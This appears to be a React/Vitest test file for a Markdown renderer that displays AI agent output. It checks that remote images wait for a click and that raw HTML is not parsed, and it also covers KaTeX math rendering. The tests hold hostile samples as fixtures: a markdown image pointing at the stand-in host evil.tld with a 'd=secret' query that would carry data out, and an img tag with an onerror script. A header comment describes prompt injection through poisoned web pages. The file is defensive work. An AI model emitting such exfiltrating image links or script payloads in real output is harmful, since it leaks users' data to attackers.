import { describe, it, expect } from "vitest";
import { fireEvent, render, screen } from "@testing-library/react";
import { Markdown } from "./markdown";

/**
 * Agent markdown is untrusted input: an agent that ingests a poisoned web page
 * can be made to emit whatever the injector wants. These guard the two ways
 * that turns into a real attack in a browser.
 */
describe("Markdown", () => {
  it("does not fetch a remote image until the reader asks for it", () => {
    const { container } = render(<Markdown>{"![](https://evil.tld/x.png?d=secret)"}</Markdown>);
    // Nothing with a remote src in the DOM = no GET, so nothing is exfiltrated.
    expect(container.querySelector("img")).toBeNull();

    fireEvent.click(screen.getByRole("button"));
    expect(container.querySelector("img")?.getAttribute("src")).toBe(
      "https://evil.tld/x.png?d=secret",
    );
  });

  it("names the host it would load from", () => {
    render(<Markdown>{"![a chart](https://evil.tld/x.png)"}</Markdown>);
    expect(screen.getByRole("button")).toHaveTextContent("evil.tld");
  });

  it("renders a same-origin file straight away", () => {
    const { container } = render(<Markdown>{"![f](/api/v1/files/abc/raw)"}</Markdown>);
    expect(container.querySelector("img")?.getAttribute("src")).toBe("/api/v1/files/abc/raw");
    expect(screen.queryByRole("button")).toBeNull();
  });

  it("renders inline math", () => {
    const { container } = render(<Markdown>{"mass–energy: $$E = mc^2$$, neat"}</Markdown>);
    expect(container.querySelector(".katex")).not.toBeNull();
    expect(container.querySelector(".katex-display")).toBeNull();
  });

  it("renders LaTeX-delimited inline math", () => {
    const { container } = render(<Markdown>{"the sum \\(a + b\\) is small"}</Markdown>);
    expect(container.querySelector(".katex")).not.toBeNull();
    // The delimiters must not survive as literal text.
    expect(container.textContent).not.toContain("\\(");
  });

  it("renders display math", () => {
    const { container } = render(<Markdown>{"$$\n\\frac{1}{2}\n$$"}</Markdown>);
    expect(container.querySelector(".katex-display")).not.toBeNull();
  });

  it("renders a \\[…\\] block as display math", () => {
    const { container } = render(<Markdown>{"before\n\n\\[\\frac{1}{2}\\]\n\nafter"}</Markdown>);
    expect(container.querySelector(".katex-display")).not.toBeNull();
  });

  it("shows malformed math as an error instead of throwing", () => {
    const { container } = render(<Markdown>{"$$\\frac{1}{$$"}</Markdown>);
    // throwOnError: false — a bad formula is red text, not a dead transcript.
    expect(container.querySelector(".katex-error")).not.toBeNull();
  });

  it("leaves money alone (single dollars are not math)", () => {
    const { container } = render(<Markdown>{"it costs $5 and $10 today"}</Markdown>);
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.textContent).toBe("it costs $5 and $10 today");
  });

  it("does not treat math delimiters inside code as math", () => {
    const { container } = render(<Markdown>{"`\\(not math\\)`"}</Markdown>);
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.querySelector("code")?.textContent).toBe("\\(not math\\)");
  });

  it("does not parse raw HTML (no rehype-raw)", () => {
    const { container } = render(
      <Markdown>{'<img src="https://evil.tld/y.png" onerror="alert(1)">'}</Markdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
  });
});
